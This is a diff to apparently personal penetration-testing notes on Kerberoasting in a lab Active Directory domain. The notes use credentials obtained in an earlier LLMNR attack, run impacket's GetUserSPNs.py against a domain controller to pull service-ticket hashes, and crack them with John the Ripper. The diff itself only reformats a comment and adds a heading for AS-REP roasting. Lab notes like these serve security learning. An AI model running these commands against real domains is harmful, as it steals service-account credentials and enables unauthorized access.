@@ -52,7 +52,7 @@ setspn -s MSSQLSvc/DomainC.offensive.local:1433 svcSQL
 
 # Step 0. Attack prerequisite: A user account with their credentials is needed for the attack. We use the franky.lanie account for which we obtained the password after the LLMNR attack.
 
-#Step 1: Find if any SNPs are available. Install impacket: sudo apt install python3-impacket
+# Step 1: Find if any SNPs are available. Install impacket: sudo apt install python3-impacket
 
 # Navigate to the python3-impacket/examples folder on your machine. Usually in /usr/share/doc/python3-impacket/examples. Run the following:
 python3 GetUserSPNs.py offensive.local/franky.lanie:Password123 -dc-ip 192.168.56.2
@@ -84,3 +84,6 @@ john --format=krb5tgs --wordlist=/usr/share/wordlists/rockyou.txt --rules hard_h
 # brute forcing password
 john --format=krb5tgs --incremental hard_hash.txt
 
+###############################################################################################################################################################################################################
+
+# AS-REP roasting
